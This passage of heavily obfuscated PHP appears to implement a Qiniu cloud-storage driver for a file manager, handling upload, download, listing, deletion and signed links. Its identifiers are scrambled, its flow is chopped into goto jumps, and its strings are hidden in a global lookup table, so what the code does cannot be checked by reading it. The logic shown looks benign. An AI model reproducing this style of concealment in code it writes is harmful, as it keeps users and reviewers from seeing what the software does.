$eÛíôø≈Â¬ = $this->get(); array_set_value($eÛíôø≈Â¬, $C›»Ã£óÏı, $Bü≤ÃÙ…ÛÉ); $this->set($Dëü∞Ç“áÖ[0], $eÛíôø≈Â¬[$Dëü∞Ç“áÖ[0]], $eäÇ∏öµ≥≠); } public function remove($cÖ√ ∞Òö√, $Cª≈≈ÕÉ€∑ = '') { $E†ÒÕÖó¯’ =& $_SERVER[™⁄»üÆ]; $this->cacheRemove($Cª≈≈ÕÉ€∑); $C•◊‚˜„◊å = $this->filterWhere(array($E†ÒÕÖó¯’[93] => $cÖ√ ∞Òö√, $E†ÒÕÖó¯’[29] => $Cª≈≈ÕÉ€∑)); if (is_null($cÖ√ ∞Òö√)) { unset($C•◊‚˜„◊å[$E†ÒÕÖó¯’[93]]); } return $this->where($C•◊‚˜„◊å)->delete(); } public function cacheSet($c»ôﬂêƒÕº, $bà≤ŸØ÷ë¥ = false) { return Cache::set($this->cacheKey($c»ôﬂêƒÕº), $bà≤ŸØ÷ë¥); } public function cacheGet($Eç÷Ωœùç„) { return Cache::get($this->cacheKey($Eç÷Ωœùç„)); } public function cacheRemove($E§ÀÍ≈÷ñŒ) { return Cache::remove($this->cacheKey($E§ÀÍ≈÷ñŒ)); } protected function filterWhere($c∆Ë®Ú÷ä¿) { return $c∆Ë®Ú÷ä¿; } protected function cacheKey($C„‡ÿ Øë›) { return $C„‡ÿ Øë›; } } goto DÚÔÓîõ¬ü; E–π·Üí≥…: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Eì¿úáô≥Ñ) { parent::__construct(); require_once SDK_DIR . $_SERVER[™⁄»üÆ][1309]; $this->_init($Eì¿úáô≥Ñ); } public function _init($eÕÉﬁ≥∑Ûœ) { goto b√É™¬èÆ; BÖ–ˆ—¥¯˜: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto C≠˜¿„âªÈ; eŸé°Ö°ò€: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto BÖ–ˆ—¥¯˜; b√É™¬èÆ: $Aøàµôÿ¢Ÿ =& $_SERVER[™⁄»üÆ]; foreach ($eÕÉﬁ≥∑Ûœ as $D“úê†ÿß‰ => $dûñﬁ∫Á÷ı) { if (isset($this->{$D“úê†ÿß‰})) { $this->{$D“úê†ÿß‰} = $dûñﬁ∫Á÷ı; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Aøàµôÿ¢Ÿ[1310] . LNG($Aøàµôÿ¢Ÿ[1270])); } goto eŸé°Ö°ò€; C≠˜¿„âªÈ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($bœõåë‹ô , $Bƒ€ß£üˆ† = '', $a‚ÆéãÆÿú = REPEAT_RENAME) { if ($this->setContent($bœõåë‹ô , $Bƒ€ß£üˆ†)) { return $this->getPathOuter($bœõåë‹ô ); } return !1; } public function mkdir($EÛ‡È◊î≠›, $dî·û∫ÂŸ¿ = REPEAT_SKIP) { goto C†ƒ∆òôßÏ; C†ƒ∆òôßÏ: $bΩÁ≥©˜çÓ =& $_SERVER[™⁄»üÆ]; $d≈æÓ’öøÁ = trim($EÛ‡È◊î≠›, $bΩÁ≥©˜çÓ[8]); if ($this->_isFolder($d≈æÓ’öøÁ)) { return $this->getPathOuter($d≈æÓ’öøÁ); } goto FÌ«Î‚¥¥¥; aø◊£ó¥∑÷: if (!$this->mkfile($A„’ÖÊáàï)) { return !1; } if (!$this->moveFile($A„’ÖÊáàï, $EÛ‡È◊î≠›)) { $this->delFile($A„’ÖÊáàï); return !1; } return $this->getPathOuter($d≈æÓ’öøÁ); goto C‹ﬂ´›«∑≥; FÌ«Î‚¥¥¥: $EÛ‡È◊î≠› = $d≈æÓ’öøÁ . $bΩÁ≥©˜çÓ[8]; $E‹á‹ïíä« = get_path_this($d≈æÓ’öøÁ); $A„’ÖÊáàï = $EÛ‡È◊î≠› . $E‹á‹ïíä«; goto aø◊£ó¥∑÷; C‹ﬂ´›«∑≥: } public function copyFile($D£Ñ®∑–·¨, $f¿áÔÌ≠»€) { $B¶Ï“’ÀÛ  = $this->bucketManager->copy($this->bucket, $D£Ñ®∑–·¨, $this->bucket, $f¿áÔÌ≠»€, !0); return $B¶Ï“’ÀÛ  ? !1 : $this->getPathOuter($f¿áÔÌ≠»€); } public function moveFile($B»è∞æŸ∏ì, $f‰∫∞∫å–Œ) { $f—‰”ƒ™√à = $this->bucketManager->move($this->bucket, $B»è∞æŸ∏ì, $this->bucket, $f‰∫∞∫å–Œ, !0); return $f—‰”ƒ™√à ? !1 : $this->getPathOuter($f‰∫∞∫å–Œ); } public function delFile($E¥Éåãõ¬ë) { if (!$this->exist($E¥Éåãõ¬ë)) { return !0; } $C¥Ü–ˆÊ®› = $this->bucketManager->delete($this->bucket, $E¥Éåãõ¬ë); return $C¥Ü–ˆÊ®› ? !1 : !0; } public function delFolder($Bö≈à±„ˆ€) { goto DµôÖáÍºﬁ; Céﬁ§‹Ã¨À: $dÉ’∆™Ùéà = $this->delByBatch($c–≈Ÿ¡ﬁµØ[$e“™…íÙÈŸ[75]]); if (!$dÉ’∆™Ùéà) { return !1; } return $this->delFile($bŸ∫åÓ„óï); goto B∞∞Ö“«©¢; DµôÖáÍºﬁ: $e“™…íÙÈŸ =& $_SERVER[™⁄»üÆ]; if (!$this->exist($Bö≈à±„ˆ€)) { return !0; } $this->listItemCache = !1; goto bìﬂ’µÜ”¢; bìﬂ’µÜ”¢: $c–≈Ÿ¡ﬁµØ = $this->fileList($Bö≈à±„ˆ€); $this->listItemCache = !0; $bŸ∫åÓ„óï = trim($Bö≈à±„ˆ€, $e“™…íÙÈŸ[8]) . $e“™…íÙÈŸ[8]; goto EØö£Æ´ﬁ‹; EØö£Æ´ﬁ‹: if (!empty($Bö≈à±„ˆ€) && $Bö≈à±„ˆ€ !== $e“™…íÙÈŸ[191] && !in_array($bŸ∫åÓ„óï, $c–≈Ÿ¡ﬁµØ[$e“™…íÙÈŸ[75]])) { $c–≈Ÿ¡ﬁµØ[$e“™…íÙÈŸ[75]][] = $bŸ∫åÓ„óï; } $dÉ’∆™Ùéà = $this->delByBatch($c–≈Ÿ¡ﬁµØ[$e“™…íÙÈŸ[74]]); if (!$dÉ’∆™Ùéà) { return !1; } goto Céﬁ§‹Ã¨À; B∞∞Ö“«©¢: } private function delByBatch($C®∑Üà…üÎ) { foreach (array_chunk($C®∑Üà…üÎ, 1000) as $f·Ç⁄≤¬Úè) { $fˆ–Õà¨áÁ = $this->bucketManager->buildBatchDelete($this->bucket, $f·Ç⁄≤¬Úè); list($Dá£–Üüè·, $FîË◊Ñ¡¨£) = $this->bucketManager->batch($fˆ–Õà¨áÁ); if ($FîË◊Ñ¡¨£) { return !1; } } return !0; } public function rename($e“◊„‚ú—∏, $C‚íÍ¬Ë»ç) { return $this->renameObject($e“◊„‚ú—∏, $C‚íÍ¬Ë»ç); } public function fileInfo($eé •Œ∂å…, $e¯ˆº¥î™æ = false, $e£™Ωé™˘ = array()) { goto cÂ·ıô«Ï≥; cÂ·ıô«Ï≥: $dÉ¢≈–åÂ∆ =& $_SERVER[™⁄»üÆ]; $dÍµÿî”Î¢ = array($dÉ¢≈–åÂ∆[28] => $this->pathThis($eé •Œ∂å…), $dÉ¢≈–åÂ∆[76] => $this->getPathOuter($dÉ¢≈–åÂ∆[8] . $eé •Œ∂å…), $dÉ¢≈–åÂ∆[29] => $dÉ¢≈–åÂ∆[193], $dÉ¢≈–åÂ∆[78] => isset($e£™Ωé™˘[$dÉ¢≈–åÂ∆[1311]]) ? $e£™Ωé™˘[$dÉ¢≈–åÂ∆[1311]] : 0, $dÉ¢≈–åÂ∆[168] => $this->ext($eé •Œ∂å…)); if ($e¯ˆº¥î™æ) { return $dÍµÿî”Î¢; } goto a›ﬂ¿œùŒ£; a›ﬂ¿œùŒ£: $dÍµÿî”Î¢[$dÉ¢≈–åÂ∆[194]] = $dÍµÿî”Î¢[$dÉ¢≈–åÂ∆[84]] = 0; $dÍµÿî”Î¢[$dÉ¢≈–åÂ∆[195]] = $dÍµÿî”Î¢[$dÉ¢≈–åÂ∆[196]] = !0; if (empty($e£™Ωé™˘)) { $e£™Ωé™˘ = $this->objectMeta($eé •Œ∂å…); if (!$e£™Ωé™˘) { return $dÍµÿî”Î¢; } } goto f–òï∫ó◊Ÿ; f–òï∫ó◊Ÿ: if (isset($e£™Ωé™˘[$dÉ¢≈–åÂ∆[1312]])) { $dÍµÿî”Î¢[$dÉ¢≈–åÂ∆[84]] = substr($e£™Ωé™˘[$dÉ¢≈–åÂ∆[1312]] . $dÉ¢≈–åÂ∆[33], 0, 10); } if (isset($e£™Ωé™˘[$dÉ¢≈–åÂ∆[1311]])) { $dÍµÿî”Î¢[$dÉ¢≈–åÂ∆[78]] = $e£™Ωé™˘[$dÉ¢≈–åÂ∆[1311]]; } return $dÍµÿî”Î¢; goto eˆãïÛïÑé; eˆãïÛïÑé: } public function folderInfo($Dà€êïœ€Â, $d®‚ÙÈŒë‹ = false) { goto f∞ù’‹Æ„; F™âàÚ©§„: $c‚Ω™Á‹¯Æ = $this->objectMeta($Dà€êïœ€Â); if (isset($c‚Ω™Á‹¯Æ[$BÆûËÜ∑ë‘[1312]])) { $e”∆Ú⁄Í¶›[$BÆûËÜ∑ë‘[84]] = substr($c‚Ω™Á‹¯Æ[$BÆûËÜ∑ë‘[1312]] . $BÆûËÜ∑ë‘[33], 0, 10); } return $e”∆Ú⁄Í¶›; goto dÖŸôÁ⁄âŸ; d”€≈Õ“Êú: $e”∆Ú⁄Í¶›[$BÆûËÜ∑ë‘[194]] = $e”∆Ú⁄Í¶›[$BÆûËÜ∑ë‘[84]] = 0; $e”∆Ú⁄Í¶›[$BÆûËÜ∑ë‘[195]] = $e”∆Ú⁄Í¶›[$BÆûËÜ∑ë‘[196]] = !0; $Dà€êïœ€Â = rtrim($Dà€êïœ€Â, $BÆûËÜ∑ë‘[8]) . $BÆûËÜ∑ë‘[8]; goto F™âàÚ©§„; f∞ù’‹Æ„: $BÆûËÜ∑ë‘ =& $_SERVER[™⁄»üÆ]; $e”∆Ú⁄Í¶› = array($BÆûËÜ∑ë‘[28] => $this->pathThis($Dà€êïœ€Â), $BÆûËÜ∑ë‘[76] => $this->getPathOuter($BÆûËÜ∑ë‘[8] . $Dà€êïœ€Â), $BÆûËÜ∑ë‘[29] => $BÆûËÜ∑ë‘[77]); if ($d®‚ÙÈŒë‹) { return $e”∆Ú⁄Í¶›; } goto d”€≈Õ“Êú; dÖŸôÁ⁄âŸ: } public function listPath($d⁄≈∂ÇÙ‹Ó, $aÖ£áã‰ÁΩ = false) { $a„–Üòƒå» =& $_SERVER[™⁄»üÆ]; $fáÜ˜…À…º = $this->fileList($d⁄≈∂ÇÙ‹Ó, $a„–Üòƒå»[8], !0); foreach ($fáÜ˜…À…º[$a„–Üòƒå»[75]] as $D¢≈å“«Øã => $d»∑ß≥ﬂøë) { $fáÜ˜…À…º[$a„–Üòƒå»[75]][$D¢≈å“«Øã] = $this->folderInfo($d»∑ß≥ﬂøë, $aÖ£áã‰ÁΩ); } foreach ($fáÜ˜…À…º[$a„–Üòƒå»[74]] as $D¢≈å“«Øã => $d»∑ß≥ﬂøë) { $fáÜ˜…À…º[$a„–Üòƒå»[74]][$D¢≈å“«Øã] = $this->fileInfo($d»∑ß≥ﬂøë[$a„–Üòƒå»[93]], $aÖ£áã‰ÁΩ, $d»∑ß≥ﬂøë); } return $fáÜ˜…À…º; } public function has($D∫¯ãé‡œÎ, $fÆ≥åæΩò§ = false, $eîÂÓñÀç√ = true) { goto A»ÃâÏﬁ›®; d≈™πá™¢: $F™§Ù∫ãÓ‘ = $B∏à˘Éº©í[33]; $C…ôá„Ãˆ∆ = 500; $c¢®”·åπË = $B∏à˘Éº©í[8]; goto b©∫ˆ„“ÇÂ; b©∫ˆ„“ÇÂ: $dÜµÖ —«ä = $fçÔË∂∑ﬂª = 0; while (!0) { check_abort(); list($dæ àç›≠Ã, $E¯é¯√‘•ﬂ) = $this->bucketManager->listFiles($this->bucket, $C¢çá∫„‘¥, $F™§Ù∫ãÓ‘, $C…ôá„Ãˆ∆, $c¢®”·åπË); if ($E¯é¯√‘•ﬂ) { break; } $F™§Ù∫ãÓ‘ = array_key_exists($B∏à˘Éº©í[1282], $dæ àç›≠Ã) ? $F™§Ù∫ãÓ‘ = $dæ àç›≠Ã[$B∏à˘Éº©í[1313]] : $B∏à˘Éº©í[33]; if ($fÆ≥åæΩò§) { if (!empty($dæ àç›≠Ã[$B∏à˘Éº©í[1314]])) { $dÜµÖ —«ä += count($dæ àç›≠Ã[$B∏à˘Éº©í[1314]]); } if (!empty($dæ àç›≠Ã[$B∏à˘Éº©í[1315]])) { $fçÔË∂∑ﬂª += count($dæ àç›≠Ã[$B∏à˘Éº©í[1315]]); } if ($F™§Ù∫ãÓ‘ === $B∏à˘Éº©í[33]) { break; } continue; } if ($eîÂÓñÀç√) { if (!empty($dæ àç›≠Ã[$B∏à˘Éº©í[1314]])) { return !0; } } else { if (!empty($dæ àç›≠Ã[$B∏à˘Éº©í[1315]])) { return !0; } } if ($F™§Ù∫ãÓ‘ === $B∏à˘Éº©í[33]) { break; } } if ($fÆ≥åæΩò§) { return array($B∏à˘Éº©í[203] => $dÜµÖ —«ä, $B∏à˘Éº©í[204] => $fçÔË∂∑ﬂª); } goto eå„˜ä«Î‡; eå„˜ä«Î‡: return !1; goto dï∆ê£Ωã†; A»ÃâÏﬁ›®: $B∏à˘Éº©í =& $_SERVER[™⁄»üÆ]; $D∫¯ãé‡œÎ = trim($D∫¯ãé‡œÎ, $B∏à˘Éº©í[8]); $C¢çá∫„‘¥ = empty($D∫¯ãé‡œÎ) && $D∫¯ãé‡œÎ !== $B∏à˘Éº©í[191] ? $B∏à˘Éº©í[33] : $D∫¯ãé‡œÎ . $B∏à˘Éº©í[8]; goto d≈™πá™¢; dï∆ê£Ωã†: } public function listAll($bÉÌ•±ë∆î) { $eŸ∆Êúçò§ =& $_SERVER[™⁄»üÆ]; $E˜´‡íﬁ™í = $this->fileList($bÉÌ•±ë∆î, $eŸ∆Êúçò§[33], !0); $DÿÉÒÂ¿Â¬ = array(); foreach ($E˜´‡íﬁ™í[$eŸ∆Êúçò§[74]] as $BΩ≈ÓŒÈ‹©) { $DÿÉÒÂ¿Â¬[$BΩ≈ÓŒÈ‹©[$eŸ∆Êúçò§[93]]] = $BΩ≈ÓŒÈ‹©[$eŸ∆Êúçò§[78]]; } foreach ($E˜´‡íﬁ™í[$eŸ∆Êúçò§[75]] as $BΩ≈ÓŒÈ‹©) { if (is_string($BΩ≈ÓŒÈ‹©)) { $DÿÉÒÂ¿Â¬[$BΩ≈ÓŒÈ‹©] = 0; } } return $this->listAllFiles($bÉÌ•±ë∆î, array_keys($DÿÉÒÂ¿Â¬), $DÿÉÒÂ¿Â¬); } private function fileList($AÁî´ìÿÇø, $dä‹®õû˜ç = '', $c ≈ô∏†Óõ = 0) { goto A¥Ñ◊∑»£ñ; DáÏ åö˘©: $DóË¿õ©Û¶ = $fÇ‰ÖÊ€äá = array(); while (!0) { check_abort(); list($FêÁñ∆‘∫©, $eµÑ≠›˘) = $this->bucketManager->listFiles($this->bucket, $aﬁ∑åüµ€è, $D∂çö‡¥êÏ, $D•ÁΩıÍ¬∫, $dä‹®õû˜ç); if ($eµÑ≠›˘) { break; } $D∂çö‡¥êÏ = array_key_exists($aÃÌÆ€ªèæ[1282], $FêÁñ∆‘∫©) ? $D∂çö‡¥êÏ = $FêÁñ∆‘∫©[$aÃÌÆ€ªèæ[1313]] : $aÃÌÆ€ªèæ[33]; $CŸπ˘ﬁêî– = isset($FêÁñ∆‘∫©[$aÃÌÆ€ªèæ[1314]]) ? $FêÁñ∆‘∫©[$aÃÌÆ€ªèæ[1314]] : array(); $cì‘—†¥ò÷ = isset($FêÁñ∆‘∫©[$aÃÌÆ€ªèæ[1315]]) ? $FêÁñ∆‘∫©[$aÃÌÆ€ªèæ[1315]] : array(); foreach ($CŸπ˘ﬁêî– as $dÚõ√Ω¶•õ) { goto aíˆµ‹à•§; aíˆµ‹à•§: if ($dÚõ√Ω¶•õ[$aÃÌÆ€ªèæ[93]] == $aﬁ∑åüµ€è) { continue; } $bÀóËö≠’á = $dÚõ√Ω¶•õ[$aÃÌÆ€ªèæ[93]]; $EìÈÚ“»ƒÚ = $dÚõ√Ω¶•õ[$aÃÌÆ€ªèæ[1311]]; goto Eä√Ê°†≥π; Eä√Ê°†≥π: $dÚõ√Ω¶•õ[$aÃÌÆ€ªèæ[78]] = $EìÈÚ“»ƒÚ; $cÔ¥ØÁ·«Â = $EìÈÚ“»ƒÚ == 0 && substr($bÀóËö≠’á, strlen($bÀóËö≠’á) - 1, 1) == $aÃÌÆ€ªèæ[8] ? !0 : !1; if ($aë§∆ù†˘‘) { $this->cacheMethod($aÃÌÆ€ªèæ[199], $bÀóËö≠’á, $cÔ¥ØÁ·«Â); $this->cacheMethod($aÃÌÆ€ªèæ[200], $bÀóËö≠’á, $dÚõ√Ω¶•õ); } goto Dæß±ôÇ∑∏; Dæß±ôÇ∑∏: if ($cÔ¥ØÁ·«Â) { $DóË¿õ©Û¶[] = $bÀóËö≠’á; continue; } $fÇ‰ÖÊ€äá[] = $c ≈ô∏†Óõ ? $dÚõ√Ω¶•õ : $bÀóËö≠’á; goto E¿—âÉõ”•; E¿—âÉõ”•: } foreach ($cì‘—†¥ò÷ as $bÀóËö≠’á) { if ($bÀóËö≠’á == $aﬁ∑åüµ€è) { continue; } $DóË¿õ©Û¶[] = $bÀóËö≠’á; if ($aë§∆ù†˘‘) { $this->cacheMethod($aÃÌÆ€ªèæ[199], $bÀóËö≠’á, !0); } } if ($D∂çö‡¥êÏ === $aÃÌÆ€ªèæ[33]) { break; } } if ($aë§∆ù†˘‘) { $this->cacheMethod($aÃÌÆ€ªèæ[199], $AÁî´ìÿÇø, !0); } goto dÁ≠ÊôÀµÇ; A¥Ñ◊∑»£ñ: $aÃÌÆ€ªèæ =& $_SERVER[™⁄»üÆ]; $AÁî´ìÿÇø = trim($AÁî´ìÿÇø, $aÃÌÆ€ªèæ[8]); $aﬁ∑åüµ€è = empty($AÁî´ìÿÇø) && $AÁî´ìÿÇø !== $aÃÌÆ€ªèæ[191] ? $aÃÌÆ€ªèæ[33] : $AÁî´ìÿÇø . $aÃÌÆ€ªèæ[8]; goto d¡ºê•≥∫Ñ; dÁ≠ÊôÀµÇ: return array($aÃÌÆ€ªèæ[75] => $DóË¿õ©Û¶, $aÃÌÆ€ªèæ[74] => $fÇ‰ÖÊ€äá); goto e‚Ø∂πΩœ‘; d¡ºê•≥∫Ñ: $D∂çö‡¥êÏ = $aÃÌÆ€ªèæ[33]; $D•ÁΩıÍ¬∫ = 1000; $aë§∆ù†˘‘ = $this->listItemCache === !1 ? !1 : !0; goto DáÏ åö˘©; e‚Ø∂πΩœ‘: } public function canRead($Fòà±Õ»…Ò) { return $this->exist($Fòà±Õ»…Ò) ? !0 : !1; } public function canWrite($E£Ÿ·Úû…Ù) { return $this->exist($E£Ÿ·Úû…Ù) ? !0 : !1; } public function getContent($bÇ◊çı©û∞) { return $this->fileSubstr($bÇ◊çı©û∞, 0, -1); } public function setContent($AáÇÙΩ·Ö—, $D©ÃÃ⁄ûÇ = '') { $A”≠é…ê√´ = $this->tempFile($this->pathThis($AáÇÙΩ·Ö—)); file_put_contents($A”≠é…ê√´, $D©ÃÃ⁄ûÇ); if ($this->upload($AáÇÙΩ·Ö—, $A”≠é…ê√´)) { $this->tempFileRemve($A”≠é…ê√´); return !0; } return !1; } public function refreshUrls($Aæò‡ﬂ’·«) { goto AãøÓæõ∏›; DæÏ≤å®≈: return $B√®®¶Øå÷[$aûåª‰ÍÔ∑[1086]] == $aûåª‰ÍÔ∑[739] ? !0 : !1; goto dñáäµ‹õ‰; d÷¡ÙÏ—¡Ô: $Aõ÷çâ¬¡’ = new Qiniu\Cdn\CdnManager($this->auth); list($B√®®¶Øå÷, $aäçÜêﬂ ó) = $Aõ÷çâ¬¡’->refreshUrls($b·í£√ÛÆæ); if ($aäçÜêﬂ ó) { return !1; } goto DæÏ≤å®≈; AãøÓæõ∏›: $aûåª‰ÍÔ∑ =& $_SERVER[™⁄»üÆ]; $b·í£√ÛÆæ = array(); if (is_array($Aæò‡ﬂ’·«)) { foreach ($Aæò‡ﬂ’·« as $d¨ƒ˘Ç‡ì√) { $b·í£√ÛÆæ[] = $this->link($d¨ƒ˘Ç‡ì√); } } else { $b·í£√ÛÆæ[] = $this->link($Aæò‡ﬂ’·«); } goto d÷¡ÙÏ—¡Ô; dñáäµ‹õ‰: } public function fileSubstr($f¬ä∂©ß¥‹, $Eõ≥⁄Ÿ”ÆÖ, $d£ù¬≥ﬁÍù) { $f§ê‡Ñ¨‡é =& $_SERVER[™⁄»üÆ]; if (!($C¥¡æßŒî = $this->link($f¬ä∂©ß¥‹))) { return !1; } $Cµ‡≈úÏ‚ç = !1; if ($d£ù¬≥ﬁÍù > 0) { $Dœèóê÷¯∫ = $Eõ≥⁄Ÿ”ÆÖ + $d£ù¬≥ﬁÍù - 1; $Cµ‡≈úÏ‚ç = array($f§ê‡Ñ¨‡é[1316] . $Eõ≥⁄Ÿ”ÆÖ . $f§ê‡Ñ¨‡é[441] . $Dœèóê÷¯∫); } $eœØﬂ–›˜ò = url_request($C¥¡æßŒî, $f§ê‡Ñ¨‡é[228], !1, $Cµ‡≈úÏ‚ç); return $eœØﬂ–›˜ò[$f§ê‡Ñ¨‡é[729]] ? $eœØﬂ–›˜ò[$f§ê‡Ñ¨‡é[1096]] : !1; } public function upload($C‡°´Óå¿è, $eäÕèÍ≠‹ª, $a≈©‹úÍñé = false, $eËï≈áÎ◊É = REPEAT_REPLACE) { $cÿê∏¥ÊíÌ = new Qiniu\Storage\UploadManager(); $fû¶“æÛ¿ = $this->auth->uploadToken($this->bucket, $C‡°´Óå¿è); $CñÆ‡Ñåÿ‘ = get_file_mime(get_path_ext($eäÕèÍ≠‹ª)); list($a¢…Üç¯¡¡, $f‹àƒí±≥™) = $cÿê∏¥ÊíÌ->putFile($fû¶“æÛ¿, $C‡°´Óå¿è, $eäÕèÍ≠‹ª, null, $CñÆ‡Ñåÿ‘); return $f‹àƒí±≥™ ? !1 : $this->getPathOuter($C‡°´Óå¿è); } public function uploadFormData($f¨ƒì™‰í•, $cƒâˆ”ù•è = 3600) { return $this->uploadToken($f¨ƒì™‰í•, $cƒâˆ”ù•è); } public function multiUploadFormData($E®ñ•—±–·, $Fçˆ£∏åÈŸ = 3600) { return $this->uploadToken($E®ñ•—±–·, $Fçˆ£∏åÈŸ); } private function uploadToken($Dñ∂∑âú´˜, $bü¬æ•√≠Ÿ = 3600) { goto bÓ¬ÉÔ‡§Ñ; bÓ¬ÉÔ‡§Ñ: $BÖË“ñí‘ì =& $_SERVER[™⁄»üÆ]; $d´›ﬂ‰Ωåå = $bü¬æ•√≠Ÿ; $bÕÃ§ÊÇ‰ã = array($BÖË“ñí‘ì[1317] => $BÖË“ñí‘ì[1318]); goto CÎ‘†Ω„ Â; CÎ‘†Ω„ Â: $fË‡ñÒßÈ™ = $Dñ∂∑âú´˜; $A‘ß≈†⁄ãÍ = $this->auth->uploadToken($this->bucket, $fË‡ñÒßÈ™, $d´›ﬂ‰Ωåå, $bÕÃ§ÊÇ‰ã, !0); $cÏ¨ß…∆⁄à = empty($this->region) || $this->region == $BÖË“ñí‘ì[1319] ? $BÖË“ñí‘ì[33] : $BÖË“ñí‘ì[441] . $this->region; goto F◊◊–Ú¬Õ›; F◊◊–Ú¬Õ›: $E∫÷ëàØ§ò = http_type() . "\72\x2f\57\165\160\x6c\x6f\141\144{$cÏ¨ß…∆⁄à}\x2e\161\151\x6e\151\165\x70\56\143\157\155\57"; return array($BÖË“ñí‘ì[1320] => $A‘ß≈†⁄ãÍ, $BÖË“ñí‘ì[1321] => $E∫÷ëàØ§ò); goto D˘∑Ã’⁄º≈; D˘∑Ã’⁄º≈: } public function download($C¯ÑÀù«€, $f±É¡´∆˜é) { goto BﬂóÃ≤ÇΩ¶; b±¬Õå¢’: fclose($B¶◊√ŸËÌù); return $f±É¡´∆˜é; goto DÃóî—ÕÀ≈; BﬂóÃ≤ÇΩ¶: $A≠û¨ç∫≈ = IO::getPathInner(IO::mkfile($f±É¡´∆˜é)); if (!($B‡ˆô‘ö∫â = $this->link($C¯ÑÀù«€))) { return !1; } $fà™Û°¢≈ë = 0; goto aîèãÎû≠≠; aîèãÎû≠≠: $Bÿª¯®ÿá‡ = 1024 * 200; $B¶◊√ŸËÌù = fopen($A≠û¨ç∫≈, $_SERVER[™⁄»üÆ][1322]); while (!0) { $cª«òÀ«ª… = $this->fileSubstr($C¯ÑÀù«€, $fà™Û°¢≈ë, $Bÿª¯®ÿá‡); if ($cª«òÀ«ª… === !1) { return !1; } fwrite($B¶◊√ŸËÌù, $cª«òÀ«ª…); $fà™Û°¢≈ë += $Bÿª¯®ÿá‡; if (strlen($cª«òÀ«ª…) < $Bÿª¯®ÿá‡) { break; } } goto b±¬Õå¢’; DÃóî—ÕÀ≈: } public function link($DªàÕ’√ö¬, $aüÙ≥¶ìÍ¡ = '') { if (!$this->isFile($DªàÕ’√ö¬)) { return !1; } $CœéáÇÉƒ‰ = $this->getHost() . $_SERVER[™⁄»üÆ][8] . $this->pathEncode($DªàÕ’√ö¬) . $aüÙ≥¶ìÍ¡; return $this->auth->privateDownloadUrl($CœéáÇÉƒ‰, 3600 * 12); } public function fileOut($D¿∞ß±ãÙ∫, $FÒπòîéüü = false, $fÔÃ°¬‘Òã = false, $fÒâ∫≤ä–ü = '') { $C◊êòàÿÜﬂ =& $_SERVER[™⁄»üÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($D¿∞ß±ãÙ∫, $FÒπòîéüü, $fÔÃ°¬‘Òã, $fÒâ∫≤ä–ü); } if (!$fÔÃ°¬‘Òã) { $fÔÃ°¬‘Òã = $this->pathThis($D¿∞ß±ãÙ∫); } $C‰›ÉÖ—⁄Ñ = $FÒπòîéüü ? $C◊êòàÿÜﬂ[1323] . rawurlencode($fÔÃ°¬‘Òã) : $C◊êòàÿÜﬂ[33]; $fÂËèÚ®Ÿ¬ = $this->link($D¿∞ß±ãÙ∫, $C‰›ÉÖ—⁄Ñ); $this->fileOutLink($fÂËèÚ®Ÿ¬); } public function fileOutServer($E£ÒœÏ√√“, $eƒâà∑ØÍÖ = false, $f∂ÖèÌÉò≈ = false, $b»æÜ£ëãÂ = '') { parent::fileOut($E£ÒœÏ√√“, $eƒâà∑ØÍÖ, $f∂ÖèÌÉò≈, $b»æÜ£ëãÂ); } public function fileOutImage($c≠éçóŒ , $Fª»—ÜßÆ∑ = 250) { $cÔô…˘äµ = $this->link($c≠éçóŒ , $_SERVER[™⁄»üÆ][1324] . $Fª»—ÜßÆ∑); $this->fileOutLink($cÔô…˘äµ); } public function fileOutImageServer($DÍÉ¡–øÇû, $b‹Ññ»åúñ = 250) { parent::fileOutImage($DÍÉ¡–øÇû, $b‹Ññ»åúñ); } public function hashMd5($BôÍ◊ìî±≤) { $BêÊç§˜®ú =& $_SERVER[™⁄»üÆ]; $D⁄ÉáÇ„û• = $this->objectMeta($BôÍ◊ìî±≤); return isset($D⁄ÉáÇ„û•[$BêÊç§˜®ú[208]]) ? $D⁄ÉáÇ„û•[$BêÊç§˜®ú[208]] : !1; $b‹´‰È«∏≥ = $this->link($BôÍ◊ìî±≤, $BêÊç§˜®ú[1325]); } public function size($EﬁÜëƒêÑä) { $aÑõ§¬´ò‘ = $this->objectMeta($EﬁÜëƒêÑä); return $aÑõ§¬´ò‘ ? $aÑõ§¬´ò‘[$_SERVER[™⁄»üÆ][78]] : 0; } public function info($b•∆£ùô‡Ù) { if ($this->isFolder($b•∆£ùô‡Ù)) { return $this->folderInfo($b•∆£ùô‡Ù); } else { if ($this->isFile($b•∆£ùô‡Ù)) { return $this->fileInfo($b•∆£ùô‡Ù); } } return !1; } public function exist($büÁø€Ñ≈ÿ) { return $this->isFile($büÁø€Ñ≈ÿ) || $this->isFolder($büÁø€Ñ≈ÿ); } public function isFile($f®Ò∞—òò‡) { return !$this->isFolder($f®Ò∞—òò‡) && $this->objectMeta($f®Ò∞—òò‡); } public function isFolder($Fê≠Œ‡ÉÛˆ) { return $this->cacheMethod($_SERVER[™⁄»üÆ][199], $Fê≠Œ‡ÉÛˆ); } protected function objectMeta($B∆õü∞é◊ø) { return $this->cacheMethod($_SERVER[™⁄»üÆ][200], $B∆õü∞é◊ø); } protected function _objectMeta($DèÒ»Ÿ§ï) { $eå•—¢≥‡· =& $_SERVER[™⁄»üÆ]; list($cøœ˜„ãÈ, $D®∞€¿ÉÒ∏) = $this->bucketManager->stat($this->bucket, $DèÒ»Ÿ§ï); if ($cøœ˜„ãÈ) { $cøœ˜„ãÈ[$eå•—¢≥‡·[78]] = intval($cøœ˜„ãÈ[$eå•—¢≥‡·[1311]]); } return $cøœ˜„ãÈ; } protected function _isFolder($e∑ÇÙ¶áâ≥) { $D¢Ω”¯ãáù =& $_SERVER[™⁄»üÆ]; if ($e∑ÇÙ¶áâ≥ == $D¢Ω”¯ãáù[33] || $e∑ÇÙ¶áâ≥ == $D¢Ω”¯ãáù[8]) { return !0; } list($eíø«ç∫•ë, $d≈Øï“êª”) = 